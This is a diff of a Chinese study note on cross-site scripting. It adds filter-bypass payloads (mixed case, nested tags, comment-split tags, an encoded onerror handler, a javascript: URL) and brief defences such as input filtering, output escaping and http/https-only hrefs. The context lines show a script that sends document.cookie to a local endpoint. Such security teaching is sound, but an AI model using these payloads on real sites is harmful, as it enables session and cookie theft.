@@ -121,3 +121,34 @@ const refer = document.referrer;
 window.location = 'http://localhost:3000/api/setCookie/?cookie=' + document.cookie+ '&refer='+refer+'&origin='+origin;
 </script>
 ```
+
+## xss的绕过处理
+- 前端限制绕过，直接抓包重放，或者直接修改html代码
+- 大小写，比如：<scRipT>alerT(111)</scRipT>
+- 拼凑：<scr<scritp>ipt>alert(1)</scr</script>itp>
+- 使用注释干扰： <sc<!--test-->ript>alert(1)</sc<!--test-->ipt>
+
+核心思路：
+后台顾虑了特殊字符，比如<script></script>标签可以被编译成各种编码，后台不一定会过滤当浏览器对该编码识别时，会翻译成正常的标签 从而执行。
+
+（在使用编码时，需要注意编码在输出点是否会被正常识别和翻译）
+
+
+```js
+<img src=x onerror="alert(1)" /> // 进行url编码("alert(1))可执行吗？ 错误例子
+
+<img src=x onerror="alert(1)" /> 使用html编码
+```
+
+输入做过滤，输出做转义
+
+
+payload
+```js
+javascrpt:alert(1)
+```
+
+防范措施
+a 标签， href如何（处理）
+1. 只允许https/http协议的
+2. 其次html的一些特殊符号的处理
